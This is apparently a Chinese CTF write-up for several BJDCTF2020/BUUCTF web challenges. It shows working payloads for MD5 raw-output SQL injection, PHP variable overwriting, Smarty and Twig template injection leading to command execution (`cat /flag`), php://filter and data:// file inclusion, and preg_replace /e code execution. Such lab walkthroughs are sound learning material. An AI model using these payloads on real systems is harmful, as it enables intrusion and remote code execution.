# Easy MD5

打开题目就一输入框把我整懵了，输入了没反应，然后目录扫描无果，查看网页源代码没发现敏感文件

然后在响应头发现

> Hint: select * from 'admin' where password=md5($pass,true)

输入`ffifdyop`

这样拼接以后就是`"select * from 'admin' where password='' or'6蒥欓!r,b' "`

or后面的句子第一个字母是非0打头的数字符，比如为 ‘ 1abc ’ 或者 ‘ -1bde ’都会被认为是true

之后进入下一个页面，查看网页源代码得到关键代码，直接数组绕过

```
<!--
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
-->
```

```
http://ec1c5bb6-221c-4577-8d10-0bc84cb670d0.node3.buuoj.cn/levels91.php?a[]=1&b[]=2
```

之后post

```
param1[]=1&param2[]=2
```

## [BJDCTF2020]Mark loves cat

首先查看网页源代码在网页最下方发现了dog，尝试以get请求拼接，无果，额只能目录扫描看看有啥可利用的了

发现.git源码泄露，使用GitHack获取关键源码

```
<?php

include 'flag.php';

$yds = "dog";
$is = "cat";
$handsome = 'yds';
//变量覆盖
foreach($_POST as $x => $y){
    $$x = $y;
}
//变量覆盖
foreach($_GET as $x => $y){
    $$x = $$y;
}

foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){ //如果GET传入的参数当中没有flag则进入循环
        exit($handsome);
    }
}

if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($yds);
}

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}



echo "the flag is: ".$flag;
```

payload1：

```
flag2=11&yds=flag
```

payload2：和上面是等价的

```
yds=flag
```

在页面最下方获取到flag



# [BJDCTF2020]The mystery of ip

一开始没有任何思路，但是在ip那里通过修改`X-Forwarded-For`请求头实现了任意ip，加了单引号等不报错，尝试SSTI

`{{6*6}}`成功输出36，`{{1.__class__}}`看见报错`Smarty Compiler: Syntax error in template`

知道了是Smarty模板，发送下面的请求包获取flag

```
GET /flag.php HTTP/1.1
Host: node3.buuoj.cn:29070
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://node3.buuoj.cn:29070/hint.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
x-forwarded-for:{system('cat /flag')}
Cookie: UM_distinctid=176eeefef524b1-06a7c2cac68426-3323765-144000-176eeefef5397e
Connection: close
```

# [BJDCTF2020]ZJCTF，不过如此

代码审计，从$text所指向的文件中读取字符串如果等于`I have a dream`则进入if语句，并且file参数当中不能包含flag，那么猜测flag就在flag.php了

```
<?php

error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }

    include($file);  //next.php
    
}
else{
    highlight_file(__FILE__);
}
?>
```

第一处采用data伪协议绕过

```
data://text/palin,I have a dream
也可以间写为
data:text/palin,I have a dream
当然也可以用base64编码绕过一些其他题目
data://text/palin;base64,SSBoYXZlIGEgZHJlYW0=
```

之后根据hint，发现没有内容

```
http://url/?text=data://text/palin,I have a dream&file=next.php
```

hh，也是伪协议就行

```
http://url/?text=data://text/palin,I have a dream&file=php://filter/read=convert.base64-encode/resource=next.php
```

将获取到的内容base64解码，一看就知道是`preg_match`在`/e`模式下的任意代码执行

```
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}


foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
	@eval($_GET['cmd']);
}
```

官方payload`/?.*={${phpinfo()}}`
即

```
<?php
preg_replace('/(.*)/ei','strtolower("\\1")','{${phpinfo()}}');
```

但这里存在的问题是，GET方式传的字符串，`.`会被替换成`_`，这里采用`\S`匹配`非空白符`

最终payload

```
http://e49c97cc-c1be-4f59-a134-899ba54d7def.node3.buuoj.cn/next.php?\S*=${getFlag()}&cmd=system('cat /flag');
```

# [BJDCTF2020]Cookie is so stable

看标题就知道肯定要控制Cookie参数了，点进去发现和上面那道题一样，这里发现是SSTI

```
GET /flag.php HTTP/1.1
Host: 158d1f46-6c3f-41db-9658-2b7f600cc4ca.node3.buuoj.cn
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://158d1f46-6c3f-41db-9658-2b7f600cc4ca.node3.buuoj.cn/flag.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: UM_distinctid=176eeefef524b1-06a7c2cac68426-3323765-144000-176eeefef5397e; PHPSESSID=3ee60c2faab39922d3ff170675090221; user={{6*6}}
Connection: close
```

测试`{{7*'7'}}`输出了49，发现是Twig模板注入，如果结果为7777777则为jinja

尝试很多payload以后发现下面这个可以

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

因此取得flag也很简单了

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
```



# 仓库地址

https://github.com/BjdsecCA/BJDCTF2020仓库地址，有空复现以下题目